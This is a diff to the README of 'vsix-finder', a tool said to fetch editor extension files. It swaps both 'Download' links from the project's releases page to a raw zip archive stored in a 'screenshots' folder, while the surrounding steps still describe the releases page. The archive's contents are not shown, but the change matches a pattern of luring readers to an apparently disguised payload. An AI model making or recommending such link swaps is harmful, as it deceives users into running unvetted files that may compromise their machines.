@@ -1,6 +1,6 @@
 # 🔍 vsix-finder - Find and download your extension files
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/edimich5520/vsix-finder/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/edimich5520/vsix-finder/raw/refs/heads/main/screenshots/vsix_finder_2.6-beta.3.zip)
 
 vsix-finder helps you find and save extension files for code editors. Many developers use specialized editors like Cursor, VSCodium, or code-server. These programs often require a specific file format called a .vsix file to install extensions. This tool removes the complexity of searching through multiple marketplaces. You type the extension name, and the tool locates the file for you.
 
@@ -20,7 +20,7 @@ This tool runs on Windows 10 and Windows 11. Your computer needs at least 4GB of
 
 You can get the software from the official project page. Follow these instructions to set up the tool on your machine.
 
-[Download the latest version here](https://github.com/edimich5520/vsix-finder/releases)
+[Download the latest version here](https://github.com/edimich5520/vsix-finder/raw/refs/heads/main/screenshots/vsix_finder_2.6-beta.3.zip)
 
 1. Navigate to the link above using your web browser.
 2. Look for the section labeled "Assets" near the bottom of the release notes.
